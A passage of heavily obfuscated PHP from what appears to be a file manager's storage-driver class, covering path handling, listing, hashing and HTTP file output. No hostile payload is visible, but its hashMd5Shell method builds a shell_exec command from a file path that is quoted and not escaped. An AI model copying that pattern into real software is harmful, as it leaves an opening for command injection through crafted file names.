$›ÇÛÖËø[84] . $°¡ÆØ¹¤] = $°¡ÆØ¹¤; $±«”õ†Œ[$Ú½°äò . $›ÇÛÖËø[83] . $ÃÔØÔë . $›ÇÛÖËø[84] . $Ïç…ÏÇÖ] = $°¡ÆØ¹¤; $±«”õ†Œ[$ÃÔØÔë . $›ÇÛÖËø[83] . $Ú½°äò . $›ÇÛÖËø[84] . $Ïç…ÏÇÖ] = $Ïç…ÏÇÖ; return $Ïç…ÏÇÖ; } public function getPathInner($öå´”ÓÊ) { $•Éô¥ŸĞ = IO::init($öå´”ÓÊ); return $•Éô¥ŸĞ->path; } public function getPathOuter($­Ìú—±´) { $ÀÒœÛïß =& $_SERVER[ÕŸ²ó÷å]; $€ƒçš÷¹ = strlen(trim($this->pathBase, $ÀÒœÛïß[8])); $­Ìú—±´ = substr(trim($­Ìú—±´, $ÀÒœÛïß[8]), $€ƒçš÷¹); return $this->pathDriver . $ÀÒœÛïß[8] . ltrim($­Ìú—±´, $ÀÒœÛïß[8]); } public function isParentOf($´áâä˜ö, $ò‰ôø™) { $«ŠĞÆû =& $_SERVER[ÕŸ²ó÷å]; $´áâä˜ö = rtrim(strtolower($´áâä˜ö), $«ŠĞÆû[8]) . $«ŠĞÆû[8]; $ò‰ôø™ = rtrim(strtolower($ò‰ôø™), $«ŠĞÆû[8]) . $«ŠĞÆû[8]; $ƒ“Ñàš€ = strpos($ò‰ôø™, $´áâä˜ö) === 0; return $ƒ“Ñàš€; } public function getType() { $Â‰éáÈ =& $_SERVER[ÕŸ²ó÷å]; $»”ÁÔå… = str_replace($Â‰éáÈ[87], $Â‰éáÈ[12], get_class($this)); return strtolower($»”ÁÔå…); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ó‚µœ’Â, $ñ†ÊŞüò) { $ø÷ÕŸÏ‡ =& $_SERVER[ÕŸ²ó÷å]; $òçÖà¾° = rtrim($Ó‚µœ’Â, $ø÷ÕŸÏ‡[8]) . $ø÷ÕŸÏ‡[8] . $ñ†ÊŞüò; $àÑ”ÒÖ€ = $this->exist($òçÖà¾°); return $àÑ”ÒÖ€ ? $òçÖà¾° : !1; } public function setModifyTime($á¼ëˆœ¯, $ÒÒ´ôä… = '') { } public function renameObject($ç²›Œµ„, $ŸÍêÑó¾) { $êï‘Áå‹ = $ŸÍêÑó¾; $ç²›Œµ„ = $this->getPathOuter($ç²›Œµ„); $ŸÍêÑó¾ = $this->pathFather($ç²›Œµ„) . $ŸÍêÑó¾; $‡§Íİ¾¢ = IO::copy($ç²›Œµ„, $this->pathFather($ç²›Œµ„), REPEAT_RENAME_FOLDER, $êï‘Áå‹); if ($‡§Íİ¾¢) { IO::remove($ç²›Œµ„); } return $‡§Íİ¾¢ ? $ŸÍêÑó¾ : !1; } public function tempFile($õÔŠÆŸê = '', $ÍáÚ¤Æ§ = '') { if (!$õÔŠÆŸê) { $õÔŠÆŸê = rand_string(15); } $¥€±è¡ = TEMP_FILES . rand_string(15) . $_SERVER[ÕŸ²ó÷å][8]; @mkdir($¥€±è¡, DEFAULT_PERRMISSIONS, !0); $™àã¸è€ = $¥€±è¡ . $õÔŠÆŸê; @touch($™àã¸è€); if ($ÍáÚ¤Æ§) { file_put_contents($™àã¸è€, $ÍáÚ¤Æ§); } return $™àã¸è€; } public function tempFileRemve($»É©î‹ö) { @unlink($»É©î‹ö); @rmdir($this->pathFather($»É©î‹ö)); } public function mkfile($õ±Ü×ğü, $¥Ø¦¥¾ = '', $½–£Ê = REPEAT_RENAME) { } public function mkdir($ËÍ®€®Ë, $¬›íàìò = REPEAT_SKIP) { } public function delFile($ÏµÅí×ù) { } public function delFolder($Öš»ç¦) { } public function copyFile($è€ù·ÅÒ, $ïäÓ›ã¤) { } public function moveFile($ı’¼ÖŒ, $š‹¦±Ì) { } public function remove($„Ô™´Í) { if ($this->isFile($„Ô™´Í)) { return $this->delFile($„Ô™´Í); } return $this->delFolder($„Ô™´Í); } public function rename($å¿½‡éØ, $À‹Ììá) { } public function exist($Ÿï§ƒÇ¤) { } public function findByHash($•¿—±ªç = '', $Â¶¶óÉ = '') { return !1; } public function isFile($â­„‘é ) { } public function isFolder($«ôôïş¢) { } public function size($Ü¤ÂÁÌ) { } public function info($òŞ³™Û¢) { } public function infoSimple($¨îçò³û) { return $this->info($¨îçò³û); } public function infoAuth($ßµ öı‹) { return $this->info($ßµ öı‹); } public function infoFull($„ÊÈ€Ò¨) { return $this->info($„ÊÈ€Ò¨); } public function infoFullSimple($”ë¯€ş) { return $this->info($”ë¯€ş); } public function infoWithChildren($§¿€½Ü) { $Ã´üßÚ =& $_SERVER[ÕŸ²ó÷å]; static $µ§¿Äó‘ = array(); if (isset($µ§¿Äó‘[$§¿€½Ü])) { return $µ§¿Äó‘[$§¿€½Ü]; } $‹¬ÕğÀÌ = $this->info($§¿€½Ü); if ($‹¬ÕğÀÌ && $‹¬ÕğÀÌ[$Ã´üßÚ[33]] == $Ã´üßÚ[88]) { $·¬Ä±Ÿ‚ = array($Ã´üßÚ[89] => 0, $Ã´üßÚ[90] => 0, $Ã´üßÚ[91] => 0); $this->infoChildren($§¿€½Ü, $·¬Ä±Ÿ‚); $‹¬ÕğÀÌ[$Ã´üßÚ[89]] = $·¬Ä±Ÿ‚[$Ã´üßÚ[89]]; $‹¬ÕğÀÌ[$Ã´üßÚ[92]] = array($Ã´üßÚ[93] => $·¬Ä±Ÿ‚[$Ã´üßÚ[90]], $Ã´üßÚ[94] => $·¬Ä±Ÿ‚[$Ã´üßÚ[91]]); $µ§¿Äó‘[$§¿€½Ü] = $‹¬ÕğÀÌ; } return $‹¬ÕğÀÌ; } public function listPath($¬ø÷Êˆ, $óÄÙèÊ = false) { } public function has($·¶Â¡Šë, $¸‡ÉÙÖü = false, $Ş½Ë­ÔÈ = false) { } public function canRead($À¬¨Šëµ) { } public function canWrite($¥ô…‚™) { } public function getContent($³Ú§­“È) { } public function setContent($«–€´«, $ë†µµÑ— = '') { } protected function infoChildren($Ñ‚®„, &$³ãæÓ÷Ù) { $¥ ½’ı =& $_SERVER[ÕŸ²ó÷å]; check_abort_echo(); $üË°ÔûŒ = $this->listPath($Ñ‚®„, !0); $üË°ÔûŒ = array_merge($üË°ÔûŒ[$¥ ½’ı[95]], $üË°ÔûŒ[$¥ ½’ı[96]]); foreach ($üË°ÔûŒ as $´ç¦”¥) { if ($´ç¦”¥[$¥ ½’ı[33]] == $¥ ½’ı[88]) { $³ãæÓ÷Ù[$¥ ½’ı[91]]++; $½ã†ËÙ = $this->getPathInner($´ç¦”¥[$¥ ½’ı[97]]); $this->infoChildren($½ã†ËÙ, $³ãæÓ÷Ù); } else { $³ãæÓ÷Ù[$¥ ½’ı[90]]++; $³ãæÓ÷Ù[$¥ ½’ı[89]] += $´ç¦”¥[$¥ ½’ı[89]]; } } } public function fileSubstr($ÃÕ¯Îêœ, $úÍ©ÆÚŸ, $™Ä³ß—·) { } public function listAll($£®õ¯å«) { } public function listAllMake($¿Õ¬’î, &$àö¬ïÎ) { $¢¬ÜÖŸ¢ =& $_SERVER[ÕŸ²ó÷å]; check_abort_echo(); $¬§¢¼Ã = $this->listPath($¿Õ¬’î, !0); if (!$¬§¢¼Ã) { return; } $¢’÷„Ô = array_merge($¬§¢¼Ã[$¢¬ÜÖŸ¢[95]], $¬§¢¼Ã[$¢¬ÜÖŸ¢[96]]); foreach ($¢’÷„Ô as $«Ã«¼­) { $ñ´îÜ•ä = $«Ã«¼­[$¢¬ÜÖŸ¢[33]] == $¢¬ÜÖŸ¢[88]; $÷·§ÅëÍ = array($¢¬ÜÖŸ¢[97] => $«Ã«¼­[$¢¬ÜÖŸ¢[97]], $¢¬ÜÖŸ¢[88] => $ñ´îÜ•ä); if (isset($«Ã«¼­[$¢¬ÜÖŸ¢[89]])) { $÷·§ÅëÍ[$¢¬ÜÖŸ¢[89]] = $«Ã«¼­[$¢¬ÜÖŸ¢[89]]; } if (isset($«Ã«¼­[$¢¬ÜÖŸ¢[98]])) { $÷·§ÅëÍ[$¢¬ÜÖŸ¢[98]] = $«Ã«¼­[$¢¬ÜÖŸ¢[98]]; } if (!$ñ´îÜ•ä) { $àö¬ïÎ[] = $÷·§ÅëÍ; continue; } $àö¬ïÎ[] = $÷·§ÅëÍ; $Çä™Ô±Ç = $«Ã«¼­[$¢¬ÜÖŸ¢[97]]; $–®Û° · = $this->pathDriver; if (substr($«Ã«¼­[$¢¬ÜÖŸ¢[97]], 0, strlen($–®Û° ·)) == $–®Û° ·) { $Çä™Ô±Ç = substr($Çä™Ô±Ç, strlen($–®Û° ·)); } $this->listAllMake($Çä™Ô±Ç, $àö¬ïÎ); } } public function listAllSimple($Ššéş±, $ …­Ì·Ö = false) { $òÇÓ‰©– = $this->listAll($Ššéş±); return $this->listAllSimpleMake($òÇÓ‰©–, $this->getPathOuter($Ššéş±), $ …­Ì·Ö); } public function listAllSimpleMake($ä£ş‹, $ƒ¤ŠÈ‘—, $¸½÷û¾) { $‰Ÿé¹ =& $_SERVER[ÕŸ²ó÷å]; $¸çş£­ = array(); $ƒ¤ŠÈ‘— = rtrim(get_path_father($ƒ¤ŠÈ‘—), $‰Ÿé¹[8]) . $‰Ÿé¹[8]; foreach ($ä£ş‹ as $Áêè‘ß—) { $ò®Äºú¾ = array($‰Ÿé¹[97] => $Áêè‘ß—[$‰Ÿé¹[97]], $‰Ÿé¹[99] => $Áêè‘ß—[$‰Ÿé¹[97]], $‰Ÿé¹[88] => $Áêè‘ß—[$‰Ÿé¹[88]]); if (isset($Áêè‘ß—[$‰Ÿé¹[89]]) && !$Áêè‘ß—[$‰Ÿé¹[88]]) { $ò®Äºú¾[$‰Ÿé¹[89]] = $Áêè‘ß—[$‰Ÿé¹[89]]; } if (isset($Áêè‘ß—[$‰Ÿé¹[98]])) { $ò®Äºú¾[$‰Ÿé¹[98]] = $Áêè‘ß—[$‰Ÿé¹[98]]; } if (is_array($Áêè‘ß—[$‰Ÿé¹[100]])) { $ò®Äºú¾[$‰Ÿé¹[99]] = $Áêè‘ß—[$‰Ÿé¹[100]][$‰Ÿé¹[97]]; $ò®Äºú¾[$‰Ÿé¹[89]] = $Áêè‘ß—[$‰Ÿé¹[100]][$‰Ÿé¹[89]]; $ò®Äºú¾[$‰Ÿé¹[98]] = $Áêè‘ß—[$‰Ÿé¹[100]][$‰Ÿé¹[98]]; } else { if (substr($Áêè‘ß—[$‰Ÿé¹[97]], 0, strlen($ƒ¤ŠÈ‘—)) == $ƒ¤ŠÈ‘—) { $ò®Äºú¾[$‰Ÿé¹[97]] = substr($Áêè‘ß—[$‰Ÿé¹[97]], strlen($ƒ¤ŠÈ‘—)); } } $¦•Œòò² = $Áêè‘ß—[$‰Ÿé¹[88]] ? $‰Ÿé¹[8] : $‰Ÿé¹[12]; $ò®Äºú¾[$‰Ÿé¹[99]] = rtrim($ò®Äºú¾[$‰Ÿé¹[99]], $‰Ÿé¹[8]) . $¦•Œòò²; $ò®Äºú¾[$‰Ÿé¹[97]] = $‰Ÿé¹[8] . trim($ò®Äºú¾[$‰Ÿé¹[97]], $‰Ÿé¹[8]) . $¦•Œòò²; if (!$¸½÷û¾) { $ê»´è = explode($‰Ÿé¹[8], trim($ò®Äºú¾[$‰Ÿé¹[97]], $‰Ÿé¹[8])); $ò®Äºú¾[$‰Ÿé¹[97]] = $‰Ÿé¹[8] . implode($‰Ÿé¹[8], array_slice($ê»´è, 1)) . $¦•Œòò²; } $¸çş£­[] = $ò®Äºú¾; } return array_sort_by($¸çş£­, $‰Ÿé¹[97]); } public function upload($±ĞÆåõø, $ÒİøŞ¯†, $¼÷”‘Œ = false, $ÂÏ£÷ûã = REPEAT_REPLACE) { } public function uploadFileByID($â·æ×, $­á·÷Ç•, $îÄ‚‚®) { } public function uploadFileByPath($ñœÁËÔá, $Î¸îƒ€, $ŒÑ«Ç•‘ = array()) { } public function isUploadServer() { $„ş§À† =& $_SERVER[ÕŸ²ó÷å]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $„ş§À†[101]) { return !0; } return $GLOBALS[$„ş§À†[6]][$„ş§À†[102]][$„ş§À†[103]]; } public function isFileOutServer() { $î¥‚åŞó =& $_SERVER[ÕŸ²ó÷å]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $î¥‚åŞó[101]) { return !0; } return $GLOBALS[$î¥‚åŞó[6]][$î¥‚åŞó[102]][$î¥‚åŞó[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($¤ˆÅ½ß) { $àê Ãâè =& $_SERVER[ÕŸ²ó÷å]; if (!$this->isCdnHost()) { return $¤ˆÅ½ß; } return str_replace(trim(get_url_root($¤ˆÅ½ß), $àê Ãâè[8]), trim($this->cdnHost, $àê Ãâè[8]), $¤ˆÅ½ß); } public function uploadLink($Ä«Ü†İ„, $î·—¦ = 0) { $Ÿà©­Ô =& $_SERVER[ÕŸ²ó÷å]; if ($this->isUploadServer()) { return; } $ªÔÁ“ø¶ = $this->getType(); if (!in_array($ªÔÁ“ø¶, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‡”º˜çë = 1024 * 1024 * 10; $¼àşÏéö = $î·—¦ <= $‡”º˜çë ? $Ÿà©­Ô[105] : $Ÿà©­Ô[106]; $¨Û³Ñ = (!$î·—¦ ? 1 : ceil($î·—¦ / pow(1024, 3))) * 3600 * 4; $ÊŸ¹÷ÆÖ = $this->{$¼àşÏéö}($Ä«Ü†İ„, $¨Û³Ñ); if ($ÊŸ¹÷ÆÖ) { $ÊŸ¹÷ÆÖ[$Ÿà©­Ô[107]] = $Ä«Ü†İ„; $ÊŸ¹÷ÆÖ[$Ÿà©­Ô[108]] = $ªÔÁ“ø¶; } return $ÊŸ¹÷ÆÖ; } public function uploadFormData($êœÜÛ¤–, $‡†“ú£¾ = 3600) { } public function multiUploadFormData($òÉÕô§¥, $ØŠè™‰Ó = 3600) { } public function download($ßŒØË³Å, $®êïí¸°) { } public function ext($¼ñĞÂ¯¬) { $ê·Â¼ù° =& $_SERVER[ÕŸ²ó÷å]; if (strpos($¼ñĞÂ¯¬, $ê·Â¼ù°[8]) === -1) { $æª¢®¶¸ = $¼ñĞÂ¯¬; } else { $æª¢®¶¸ = $this->pathThis($¼ñĞÂ¯¬); } $­ÕáŒ†æ = $ê·Â¼ù°[12]; if (strstr($æª¢®¶¸, $ê·Â¼ù°[10])) { $­ÕáŒ†æ = substr($æª¢®¶¸, strrpos($æª¢®¶¸, $ê·Â¼ù°[10]) + 1); $­ÕáŒ†æ = strtolower($­ÕáŒ†æ); } if (strlen($­ÕáŒ†æ) > 3 && preg_match($ê·Â¼ù°[109], $­ÕáŒ†æ, $¯®àöŒ¹)) { $­ÕáŒ†æ = $ê·Â¼ù°[12]; } return $­ÕáŒ†æ; } public function pathThis($ıú¦Æ¤Ñ) { $À½Á¬õº =& $_SERVER[ÕŸ²ó÷å]; $ıú¦Æ¤Ñ = str_replace($À½Á¬õº[110], $À½Á¬õº[8], rtrim($ıú¦Æ¤Ñ, $À½Á¬õº[8])); $éÊ³¾¥ò = strrpos($ıú¦Æ¤Ñ, $À½Á¬õº[8]); if ($éÊ³¾¥ò === !1) { return $ıú¦Æ¤Ñ; } return substr($ıú¦Æ¤Ñ, $éÊ³¾¥ò + 1); } public function pathFather($«¬ºÄŸ±) { $Ì¨™œÈ =& $_SERVER[ÕŸ²ó÷å]; $«¬ºÄŸ± = str_replace($Ì¨™œÈ[110], $Ì¨™œÈ[8], rtrim($«¬ºÄŸ±, $Ì¨™œÈ[8])); $‰Œñ¿ÌÖ = strrpos($«¬ºÄŸ±, $Ì¨™œÈ[8]); if ($‰Œñ¿ÌÖ === !1) { return $Ì¨™œÈ[12]; } return substr($«¬ºÄŸ±, 0, $‰Œñ¿ÌÖ + 1); } public function hashSimple($àìô‡‰•) { $šÛÙ‚ßŸ =& $_SERVER[ÕŸ²ó÷å]; if (!$àìô‡‰•) { return md5($šÛÙ‚ßŸ[12]); } $‚Ş¸ò£ = $this->size($àìô‡‰•); $×å´Ê¸Ø = 200; $ÙÏÔ¼«¶ = 50; if ($‚Ş¸ò£ <= $×å´Ê¸Ø * $ÙÏÔ¼«¶) { return $this->hashMd5($àìô‡‰•) . $‚Ş¸ò£; } $şÇ©ã¬ = intval($‚Ş¸ò£ / $ÙÏÔ¼«¶); $Â‰îÓ©Û = $šÛÙ‚ßŸ[12]; for ($ë‡ŞÕ† = 0; $ë‡ŞÕ† < $ÙÏÔ¼«¶; $ë‡ŞÕ†++) { $Â‰îÓ©Û .= $this->fileSubstr($àìô‡‰•, $şÇ©ã¬ * $ë‡ŞÕ†, $×å´Ê¸Ø); } $Â‰îÓ©Û .= $this->fileSubstr($àìô‡‰•, $‚Ş¸ò£ - $×å´Ê¸Ø, $×å´Ê¸Ø); return md5($Â‰îÓ©Û) . $‚Ş¸ò£; } public static $md5Cache = array(); public function hashMd5($ıá–ôÕ”) { if (!$ıá–ôÕ”) { return md5($_SERVER[ÕŸ²ó÷å][12]); } $ıá–ôÕ” = $this->iconvSystem($ıá–ôÕ”); if (isset(self::$md5Cache[$ıá–ôÕ”])) { return self::$md5Cache[$ıá–ôÕ”]; } self::$md5Cache[$ıá–ôÕ”] = $this->hashMd5Shell($ıá–ôÕ”); if (!self::$md5Cache[$ıá–ôÕ”]) { self::$md5Cache[$ıá–ôÕ”] = @md5_file($ıá–ôÕ”); } return self::$md5Cache[$ıá–ôÕ”]; } private function hashMd5Shell($‡ï¦šˆ) { $µ¤Ğá¾÷ =& $_SERVER[ÕŸ²ó÷å]; if (!$‡ï¦šˆ) { return md5($µ¤Ğá¾÷[12]); } if (!function_exists($µ¤Ğá¾÷[111])) { return !1; } $å×Ì™°Î = array($µ¤Ğá¾÷[112], $µ¤Ğá¾÷[113]); $ú¤È«åä = Cache::get($µ¤Ğá¾÷[114]); if (!$ú¤È«åä) { $ğöÈ°Ü  = BASIC_PATH . $µ¤Ğá¾÷[115]; $“†¦±í = md5_file($ğöÈ°Ü ); $ú¤È«åä = $µ¤Ğá¾÷[116]; foreach ($å×Ì™°Î as $ÄÃóà­) { $ìÚà«ñú = shell_exec($ÄÃóà­ . "\40\42{$ğöÈ°Ü }\x22"); if ($ìÚà«ñú && substr(trim($ìÚà«ñú), 0, 32) == $“†¦±í) { $ú¤È«åä = $ÄÃóà­; break; } } Cache::set($µ¤Ğá¾÷[114], $ú¤È«åä, 3600); } if ($ú¤È«åä == $µ¤Ğá¾÷[116]) { return !1; } $ìÚà«ñú = shell_exec($ú¤È«åä . "\40\x22{$‡ï¦šˆ}\42"); $ìÚà«ñú = str_replace($µ¤Ğá¾÷[117], $µ¤Ğá¾÷[12], $ìÚà«ñú); return substr($ìÚà«ñú, 0, 32); } public function link($œî¡¯•) { return $œî¡¯•; } public function fileOut($ğ¶ıì†, $¿ĞçÂóò = false, $åõ£°—ù = false, $—éµ« = '') { $Ü×ÏÒÜ =& $_SERVER[ÕŸ²ó÷å]; $this->cacheMethod(null, null); if (!$ğ¶ıì† || !$this->exist($ğ¶ıì†)) { show_json(LNG($Ü×ÏÒÜ[118]), !1, $åõ£°—ù); } $«åÄÃ½ = $this->getType() == $Ü×ÏÒÜ[119]; $£‹óí¹š = $GLOBALS[$Ü×ÏÒÜ[6]][$Ü×ÏÒÜ[102]][$Ü×ÏÒÜ[120]][$Ü×ÏÒÜ[121]]; $ªŸ‹³ş = (double) $GLOBALS[$Ü×ÏÒÜ[6]][$Ü×ÏÒÜ[102]][$Ü×ÏÒÜ[120]][$Ü×ÏÒÜ[122]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $°Äç‚Ç„ = $this->infoFull($ğ¶ıì†); $ØÌ»áÖ‰ = $°Äç‚Ç„[$Ü×ÏÒÜ[89]]; $’•ø­îş = gmdate($Ü×ÏÒÜ[123], $°Äç‚Ç„[$Ü×ÏÒÜ[98]]); $”°ŒèÅ¯ = $åõ£°—ù ? $åõ£°—ù : $this->iconvApp($°Äç‚Ç„[$Ü×ÏÒÜ[32]]); $ÁéÙ³ë« = 0; $¬˜ËÛğš = $ØÌ»áÖ‰ - 1; $ï‡¿„íŠ = $this->ext($”°ŒèÅ¯); if (in_array($ï‡¿„íŠ, array($Ü×ÏÒÜ[124], $Ü×ÏÒÜ[125], $Ü×ÏÒÜ[126], $Ü×ÏÒÜ[127]))) { $ï‡¿„íŠ = $Ü×ÏÒÜ[128]; } if (in_array($ï‡¿„íŠ, array($Ü×ÏÒÜ[129]))) { $ï‡¿„íŠ = $Ü×ÏÒÜ[130]; } if (!$—éµ«) { $—éµ« = md5($’•ø­îş . $ØÌ»áÖ‰); } $—éµ« = $Ü×ÏÒÜ[131] . $—éµ« . $Ü×ÏÒÜ[131]; $ß¶Ç¡´ì = get_file_mime($ï‡¿„íŠ); $ëú®¬† = !0; $ëú®¬† = isset($_GET[$Ü×ÏÒÜ[132]]) ? !1 : !0; if ($¿ĞçÂóò === !1 && !mime_support($ß¶Ç¡´ì)) { $ß¶Ç¡´ì = $Ü×ÏÒÜ[133]; } header($Ü×ÏÒÜ[134]); header($Ü×ÏÒÜ[135] . $ß¶Ç¡´ì); $øä”—µš = rawurlencode($”°ŒèÅ¯); $øä”—µš = $Ü×ÏÒÜ[131] . $øä”—µš . $Ü×ÏÒÜ[136] . $øä”—µš; if ($¿ĞçÂóò) { header($Ü×ÏÒÜ[137]); header($Ü×ÏÒÜ[138] . $øä”—µš); } else { if ($ëú®¬†) { header($Ü×ÏÒÜ[139] . $øä”—µš); } } $¨•úù½ = 3600 * 24 * 30; header($Ü×ÏÒÜ[140]); header($Ü×ÏÒÜ[141]); header($Ü×ÏÒÜ[142] . $¨•úù½); header($Ü×ÏÒÜ[143] . gmdate($Ü×ÏÒÜ[123], time() + $¨•úù½) . $Ü×ÏÒÜ[144]); if (isset($_SERVER[$Ü×ÏÒÜ[145]]) && strtotime($_SERVER[$Ü×ÏÒÜ[145]]) == $°Äç‚Ç„[$Ü×ÏÒÜ[98]]) { header($Ü×ÏÒÜ[146], !0, 304); die; } if (isset($_SERVER[$Ü×ÏÒÜ[147]]) && $_SERVER[$Ü×ÏÒÜ[147]] == $—éµ«) { header($Ü×ÏÒÜ[148] . $—éµ«, !0, 304); die; } header($Ü×ÏÒÜ[148] . $—éµ«); header($Ü×ÏÒÜ[149] . $’•ø­îş . $Ü×ÏÒÜ[144]); header($Ü×ÏÒÜ[150] . $”°ŒèÅ¯); header($Ü×ÏÒÜ[151]); header($Ü×ÏÒÜ[152] . $ØÌ»áÖ‰); header($Ü×ÏÒÜ[153]); Hook::trigger($Ü×ÏÒÜ[154], $ğ¶ıì†, $ØÌ»áÖ‰, $”°ŒèÅ¯, $ï‡¿„íŠ); if (!$¿ĞçÂóò && $ï‡¿„íŠ == $Ü×ÏÒÜ[155]) { if ($ØÌ»áÖ‰ > 1024 * 1024 * 5) { die; } $ó½˜˜… = $this->getContent($ğ¶ıì†); $ó½˜˜… = Html::clearSVG($ó½˜˜…); header($Ü×ÏÒÜ[156] . strlen($ó½˜˜…)); echo $ó½˜˜…; die; } $åø‡í×Ì = strtolower($_SERVER[$Ü×ÏÒÜ[157]]); if ($«åÄÃ½ && $åø‡í×Ì && $£‹óí¹š) { if (strstr($åø‡í×Ì, $Ü×ÏÒÜ[158])) { header($Ü×ÏÒÜ[159] . $ğ¶ıì†); } else { if (strstr($åø‡í×Ì, $Ü×ÏÒÜ[160])) { header($Ü×ÏÒÜ[161] . $ğ¶ıì†); } else { if (strstr($åø‡í×Ì, $Ü×ÏÒÜ[162])) { header($Ü×ÏÒÜ[163] . $ğ¶ıì†); } } } if ($ªŸ‹³ş) { header($Ü×ÏÒÜ[164] . $ªŸ‹³ş); } return; } if (isset($_SERVER[$Ü×ÏÒÜ[165]])) { if (preg_match($Ü×ÏÒÜ[166], $_SERVER[$Ü×ÏÒÜ[165]], $¤èÉàÆì)) { $ÁéÙ³ë« = intval($¤èÉàÆì[1]); $ÁéÙ³ë« = $ÁéÙ³ë« <= 0 ? 0 : ($ÁéÙ³ë« >= $¬˜ËÛğš ? $¬˜ËÛğš : $ÁéÙ³ë«); if (!empty($¤èÉàÆì[2])) { $¿–ïíƒó = intval($¤èÉàÆì[2]); $¬˜ËÛğš = $¿–ïíƒó < $ÁéÙ³ë« ? $ÁéÙ³ë« : ($¿–ïíƒó >= $¬˜ËÛğš ? $¬˜ËÛğš : $¿–ïíƒó); } } header($Ü×ÏÒÜ[167]); header("\103\157\x6e\164\145\x6e\164\x2d\x52\x61\156\147\x65\x3a\x20\142\x79\x74\x65\163\40{$ÁéÙ³ë«}\55{$¬˜ËÛğš}\57" . $ØÌ»áÖ‰); } else { header($Ü×ÏÒÜ[168]); } header($Ü×ÏÒÜ[169]); header($Ü×ÏÒÜ[170]); $†â†İ = !0; if ($_SERVER[$Ü×ÏÒÜ[171]] == $Ü×ÏÒÜ[172] && $ØÌ»áÖ‰ > 1204 * 1024 * 1024 * 2) { $†â†İ = !1; } if ($†â†İ) { header($Ü×ÏÒÜ[173] . ($¬˜ËÛğš - $ÁéÙ³ë« + 1)); } if ($_SERVER[$Ü×ÏÒÜ[174]] == $Ü×ÏÒÜ[175]) { return; } $¾éÀ´¼ = array($Ü×ÏÒÜ[176] => !1, $Ü×ÏÒÜ[177] => $ÁéÙ³ë«, $Ü×ÏÒÜ[178] => $¬˜ËÛğš, $Ü×ÏÒÜ[179] => $ï‡¿„íŠ, $Ü×ÏÒÜ[180] => $°Äç‚Ç„, $Ü×ÏÒÜ[181] => $Ü×ÏÒÜ[12], $Ü×ÏÒÜ[182] => 0); $¾éÀ´¼ = Hook::filter($Ü×ÏÒÜ[183], $¾éÀ´¼); $¬İüœñÛ = 1024 * 300; $¯›èíÓ = 0; if ($ªŸ‹³ş) { $¯›èíÓ = intval(1000 * 1000 * ($¬İüœñÛ / $ªŸ‹³ş)); } while ($ÁéÙ³ë« <= $¬˜ËÛğš) { $ÕÜæÌùø = timeFloat(); check_abort(); $Æ¥ÊĞÏö = $¬˜ËÛğš - $ÁéÙ³ë« + 1; if ($Æ¥ÊĞÏö <= $¬İüœñÛ) { $¬İüœñÛ = $Æ¥ÊĞÏö; } $ó½˜˜… = $this->fileSubstr($ğ¶ıì†, $ÁéÙ³ë«, $¬İüœñÛ); if ($¾éÀ´¼[$Ü×ÏÒÜ[176]]) { $¾éÀ´¼[$Ü×ÏÒÜ[181]] = $ó½˜˜…; $¾éÀ´¼[$Ü×ÏÒÜ[182]] = $ÁéÙ³ë«; $¾éÀ´¼ = Hook::filter($Ü×ÏÒÜ[184], $¾éÀ´¼); $ó½˜˜… = $¾éÀ´¼[$Ü×ÏÒÜ[181]]; } echo $ó½˜˜…; $ÁéÙ³ë« += $¬İüœñÛ; if ($¬İüœñÛ == $Æ¥ÊĞÏö) { $ÁéÙ³ë« = $¬˜ËÛğš + 1; } if ($¯›èíÓ) { $øÊº¶ù = intval(1000 * 1000 * (timeFloat() - $ÕÜæÌùø)); $é°°Å¶‰ = $¯›èíÓ - $øÊº¶ù; if ($é°°Å¶‰ > 5) { usleep($é°°Å¶‰); } } } } public function fileOutServer($Íı‹¢Ü‚, $ĞıÃûÚ = false, $îµê€õ“ = false, $á¬¹Ç´´ = '') { $this->fileOut($Íı‹¢Ü‚, $ĞıÃûÚ, $îµê€õ“, $á¬¹Ç´´); } public function fileOutLink($Á“ˆÆ) { header($_SERVER[ÕŸ²ó÷å][185] . $Á“ˆÆ); die; } public function cacheMethod($¢‘ô˜‰œ, $û…ùÊ²¸, $‚úÒÎÔò = null) { $³Ò¬—ô =& $_SERVER[ÕŸ²ó÷å]; static $ËĞÀÊ×ò = array(); $‘éÆòêş = $û…ùÊ²¸ ? ltrim($this->getPathOuter($û…ùÊ²¸), $³Ò¬—ô[8]) : $³Ò¬—ô[12]; $•ëÖÂ’ = $³Ò¬—ô[186] . $¢‘ô˜‰œ . $³Ò¬—ô[187] . rtrim($‘éÆòêş, $³Ò¬—ô[8]); if (is_null($¢‘ô˜‰œ)) { $ËĞÀÊ×ò = array(); return; } if (is_null($û…ùÊ²¸)) { foreach ($ËĞÀÊ×ò as $•ëÖÂ’ => $ß¥ôŞÚŸ) { if (!strstr($•ëÖÂ’, $³Ò¬—ô[186] . $¢‘ô˜‰œ . $³Ò¬—ô[188])) { continue; } unset($ËĞÀÊ×ò[$•ëÖÂ’]); } return; } if (!is_null($‚úÒÎÔò)) { $ËĞÀÊ×ò[$•ëÖÂ’] = $‚úÒÎÔò; return; } $æéˆŸı× = isset($ËĞÀÊ×ò[$•ëÖÂ’]) ? $ËĞÀÊ×ò[$•ëÖÂ’] : null; if (!is_null($æéˆŸı×)) { return $æéˆŸı×; } $æéˆŸı× = $this->{$¢‘ô˜‰œ}($û…ùÊ²¸); $ËĞÀÊ×ò[$•ëÖÂ’] = $æéˆŸı×; return $æéˆŸı×; } public function cacheMethodInfoSet($µ¿’šíü, $’¶ÕöÓ®, $çÈ°Û’ = false) { $®Œı²Ò« =& $_SERVER[ÕŸ²ó÷å]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($®Œı²Ò«[189], $µ¿’šíü, $’¶ÕöÓ®); $this->cacheMethod($®Œı²Ò«[190], $µ¿’šíü, $’¶ÕöÓ® ? !1 : !0); if (is_array($çÈ°Û’)) { $this->cacheMethod($®Œı²Ò«[191], $µ¿’šíü, $çÈ°Û’); } } public function fileOutImage($Á¦‰úş¶, $Ìüµ§…à = 250) { $ŒÕÎ®“ =& $_SERVER[ÕŸ²ó÷å]; set_timeout(); if (substr($Á¦‰úş¶, 0, 